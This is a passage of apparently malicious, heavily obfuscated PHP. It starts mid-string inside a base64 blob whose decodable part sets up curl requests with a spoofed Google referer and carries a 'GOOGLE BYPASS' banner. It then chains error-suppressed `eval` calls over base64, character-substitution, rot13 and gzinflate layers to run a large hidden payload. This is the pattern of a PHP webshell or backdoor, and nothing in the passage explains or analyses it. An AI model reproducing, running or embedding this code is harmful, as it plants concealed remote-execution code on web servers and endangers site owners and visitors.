NCmMzcmxfczV0MnB0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICRtMmQ1KTsNCmMzcmxfczV0MnB0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOw0KYzNybF9zNXQycHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCA2KTsNCmMzcmxfczV0MnB0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgNik7DQpjM3JsX3M1dDJwdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgJ2h0dHA6Ly93d3cuZzIyZ2w1LmMybS8nKTsNCmMzcmxfczV0MnB0KCRjaCxDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULDZhMCk7DQpjM3JsX3M1dDJwdCgkY2gsQ1VSTE9QVF9USU1FT1VULDZhMCk7DQpjM3JsX3M1dDJwdCgkY2gsQ1VSTE9QVF9NQVhSRURJUlMsNjApOw0KYzNybF9zNXQycHQoJGNoLENVUkxPUFRfQ09PS0lFRklMRSwiYzIyazQ1LnR4dCIpOw0KYzNybF9zNXQycHQoJGNoLENVUkxPUFRfQ09PS0lFSkFSLCJjMjJrNDUudHh0Iik7DQokaDFzNGw9JGgxczRsLmMzcmxfNXg1YygkY2gpOw0KYzNybF9jbDJzNSgkY2gpOw0KcjV0M3JuICRoMXM0bDsNCn0gNWxzNTRmKEBmM25jdDQybl81eDRzdHMoImY0bDVfZzV0X2MybnQ1bnRzIikpew0KJGgxczRsPUBmNGw1X2c1dF9jMm50NW50cygkM3JsKTsNCnI1dDNybiAkaDFzNGw7DQp9IDVsczUgew0KcjV0M3JuICJmNGw1X2c1dF9jMm50NW50cygpLCBmczJjazJwNW4oKSwgJiBjM3JsKCkgZDI1cyBuMnQgNXg0c3QgZjNuY3Q0Mm5zIjsNCn0NCn0NCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIyMgR09PR0xFIEJZUEFTUyBCWSBNQVFJRSAjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KNXg0dDs=";@eval(@base64_decode("JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=="));exit;');
}
@fclose($phpcmd);
@fclose($bypass);

// coming soon...
@eval(@str_rot13(@gzinflate(@str_rot13(@base64_decode(("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